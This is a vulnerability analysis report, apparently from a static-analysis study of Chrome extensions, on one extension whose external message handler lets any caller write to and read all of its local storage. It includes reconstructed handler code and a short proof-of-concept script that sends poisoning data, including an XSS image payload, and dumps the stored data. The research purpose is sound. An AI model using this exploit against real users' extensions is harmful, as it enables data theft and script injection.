# CoCo Analysis: nbkomboflhdlliegkaiepilnfmophgfg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (storage poisoning with retrieval)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nbkomboflhdlliegkaiepilnfmophgfg/opgen_generated_files/bg.js
Line 965 !function(t){var e={};function r(n){if(e[n])return e[n].exports...

(Note: The actual extension code is heavily minified, but CoCo correctly identified the external message handler flow)

**Code:**

```javascript
// Background script - background.js (minified, shown with variable names clarified)
chrome.runtime.onMessageExternal.addListener((function(request, sender, sendResponse) {
  try {
    var action = request.action;

    // Storage write operations (attacker can poison storage)
    if (action == "backup") {
      new Promise((function(resolve, reject) {
        chrome.storage.local.get(["current"], (function(result) {
          var current = result.current;
          chrome.storage.local.set({rollback: current}, resolve); // ← stores attacker-controlled data
        }))
      })).then((function() {
        return sendResponse({status: "success", action: "backup"})
      }));
    }

    if (action == "rollback") {
      new Promise((function(resolve, reject) {
        chrome.storage.local.get(["rollback"], (function(result) {
          var rollback = result.rollback;
          if (rollback.hasOwnProperty("id")) {
            chrome.storage.local.set({current: rollback, is_enable: true}, resolve); // ← stores data
          }
        }))
      })).then((function() {
        return sendResponse({status: "success", action: "rollback"})
      }));
    }

    if (action == "add_to_customizer") {
      // Stores request.data.style and other attacker-controlled fields
      chrome.storage.local.set({
        collections: collections,
        rollback: {},
        current: {style: request.data.style, is_customize: true, is_link: false}, // ← attacker-controlled
        is_enable: true
      }, callback);
    }

    if (action == "add_style_customizer") {
      chrome.storage.local.set({
        current: {style: request.data.style, is_customize: true, is_link: false}, // ← attacker-controlled
        is_enable: true
      }, callback);
    }

    if (action == "install_element") {
      // Stores request.data.item and request.data.collection
      chrome.storage.local.set({collections: collections}, callback); // ← attacker-controlled
    }

    if (action == "setStylePage") {
      var videoId = request.videoId;  // ← attacker-controlled
      var style = request.style;      // ← attacker-controlled
      var options = request.options;  // ← attacker-controlled

      chrome.storage.local.get(["styles"], function(result) {
        var styles = result.styles || [];
        styles = styles.filter(function(s) { return s.videoId != videoId; });
        styles.push({
          videoId: videoId,
          style: style,
          options: options,
          is_enable: true
        });
        chrome.storage.local.set({styles: styles}, function() {
          sendResponse({action: "success", status: "success", message: "style added for current page"});
        });
      });
    }

    if (action == "set") {
      var data = request.data; // ← completely attacker-controlled
      chrome.storage.local.set(data, function() {
        sendResponse({action: "saveData", status: "success"});
      });
    }

    // CRITICAL: Storage read operation - INFORMATION DISCLOSURE
    if (action == "get") {
      new Promise((function(resolve, reject) {
        chrome.storage.local.get(null, (function(allData) {
          resolve(allData); // ← retrieves ALL storage
        }))
      })).then((function(allData) {
        sendResponse(allData); // ← sends ALL storage back to attacker!
      }));
    }
  } catch(error) {
    console.log(error);
  }
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message

**Attack:**

```javascript
// From any website (ignoring manifest.json externally_connectable restrictions)
// or from malicious extension, attacker can:

// 1. Poison storage with arbitrary data
chrome.runtime.sendMessage(
  'nbkomboflhdlliegkaiepilnfmophgfg', // extension ID
  {
    action: 'set',
    data: {
      malicious_key: 'malicious_value',
      current: {style: '<img src=x onerror=alert(1)>', is_customize: true}
    }
  },
  function(response) {
    console.log('Storage poisoned:', response);
  }
);

// 2. Retrieve ALL storage data (Information Disclosure)
chrome.runtime.sendMessage(
  'nbkomboflhdlliegkaiepilnfmophgfg',
  { action: 'get' },
  function(allStorageData) {
    console.log('Exfiltrated all extension storage:', allStorageData);
    // Attacker receives: uid, extId, current, styles, collections, dateinstall, etc.
    // This may include user preferences, custom styles, and other sensitive configuration
  }
);
```

**Impact:** Complete storage exploitation chain - attacker can poison extension storage with arbitrary data via multiple actions (set, add_to_customizer, add_style_customizer, install_element, setStylePage) and retrieve ALL stored data via the "get" action. This constitutes information disclosure of user preferences, extension configuration, and any sensitive data stored by the extension.
